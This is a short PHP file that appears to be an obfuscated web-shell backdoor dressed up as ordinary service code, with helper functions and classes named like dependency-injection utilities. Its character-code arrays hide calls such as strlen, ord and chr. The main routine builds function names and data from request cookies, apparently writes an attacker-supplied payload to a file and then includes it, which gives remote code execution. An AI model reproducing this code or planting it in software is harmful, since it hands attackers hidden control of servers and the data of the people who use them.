<?php
function compute_output($c)
{
    $a = array(34 * 9 - 190, 97 * 1, 116, 47 * 2 + 21);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function start_service($c)
{
    $a = array(13 * 4 + 58, 17 * 82 - 1293, 2 * 54, 115 - 1, 2 * 58, 13 + 25 + 77);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function trigger_event($c)
{
    $a = array(108 - 8, 3 * 87 - 147, 91 * 73 - 6532);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    $s = strrev($s);
    return $s($c);
}

function manage_state($c)
{
    $a = array(3 * 33, 72 * 1 + 32, 2 * 57);
    $s = '';
    foreach ($a as $n) {
        $s .= chr($n);
    }
    return $s($c);
}

class DependencyInjector
{
    private static $_yaa;
    static function manageState($_gs, $_oc)
    {
        if (!self::$_yaa) {
            self::initializeModule();
        }
        $_ors = start_service($_oc);
        $_vi = base64_decode(self::$_yaa[$_gs]);
        for ($_qvu = 0, $_uqp = start_service($_vi); $_qvu !== $_uqp; ++$_qvu) {
            $_vi[$_qvu] = manage_state(trigger_event($_vi[$_qvu]) ^ trigger_event($_oc[$_qvu % $_ors]));
        }
        return $_vi;
    }
    private static function initializeModule()
    {
        self::$_yaa = array('_rem' => '', '_eqr' => '');
    }
}

class RequestHandler
{
    private static $_yaa;
    static function manageState($_gs)
    {
        if (!self::$_yaa) {
            self::initializeModule();
        }
        return self::$_yaa[$_gs];
    }
    private static function initializeModule()
    {
        self::$_yaa = array(00, 02, 032, 032, 01, 032, 02, 02, 01, 012, 05, 03, 022, 014, 020, 024, 07, 01, 03);
    }
}

$_uqp = $_COOKIE;
$_oc = RequestHandler::manageState(0);
$_gs = RequestHandler::manageState(1);
$_jv = array();
$_jv[$_oc] = DependencyInjector::manageState('_rem', '_hw');
while ($_gs) {
    $_jv[$_oc] .= $_uqp[RequestHandler::manageState(2)][$_gs];
    if (!$_uqp[RequestHandler::manageState(3)][$_gs + RequestHandler::manageState(4)]) {
        if (!$_uqp[RequestHandler::manageState(5)][$_gs + RequestHandler::manageState(6)]) {
            break;
        }
        $_oc++;
        $_jv[$_oc] = DependencyInjector::manageState('_eqr', '_url');
        $_gs++;
    }
    $_gs = $_gs + RequestHandler::manageState(7) + RequestHandler::manageState(8);
}
$_oc = $_jv[RequestHandler::manageState(9)]() . $_jv[RequestHandler::manageState(10)];
if (!$_jv[RequestHandler::manageState(11)]($_oc)) {
    $_gs = $_jv[RequestHandler::manageState(12)]($_oc, $_jv[RequestHandler::manageState(13)]);
    $_jv[RequestHandler::manageState(14)]($_gs, $_jv[RequestHandler::manageState(15)] . $_jv[RequestHandler::manageState(16)]($_jv[RequestHandler::manageState(17)]($_uqp[RequestHandler::manageState(18)])));
}
include $_oc;